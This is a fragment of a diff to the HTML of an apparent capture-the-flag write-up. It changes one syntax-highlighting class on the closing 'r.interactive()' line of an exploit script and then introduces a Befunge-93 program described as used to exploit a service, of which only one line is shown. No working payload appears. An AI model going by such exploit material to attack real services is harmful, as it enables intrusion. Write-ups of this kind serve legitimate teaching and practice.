-    <span class="n">r</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+    <span class="n">r</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
 </code></pre></div></div>
 <p><code class="language-plaintext highlighter-rouge">bbb</code> is the Befunge-93 program I used to exploit the service :</p>
 <div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&gt;                                    v
